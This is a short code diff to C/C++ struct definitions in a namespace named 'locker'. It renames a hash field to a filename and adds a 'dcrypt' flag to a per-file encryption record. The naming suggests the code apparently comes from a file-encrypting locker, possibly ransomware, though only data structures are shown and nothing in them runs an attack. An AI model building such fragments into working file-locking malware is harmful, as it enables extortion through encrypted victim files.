@@ -55,7 +55,7 @@ namespace locker
 {
 	typedef struct HashList
 	{
-		BYTE* hash_sum;
+		char* Filename;
 		BYTE* hash;
 		size_t hash_size;
 		SLIST_ENTRY(HashList);
@@ -125,6 +125,7 @@ namespace locker
 #else
 	typedef struct file_info
 	{
+		int dcrypt;
 		void* ctx;
 		PCRYPT_INFO CryptInfo;
 		char* Filename;
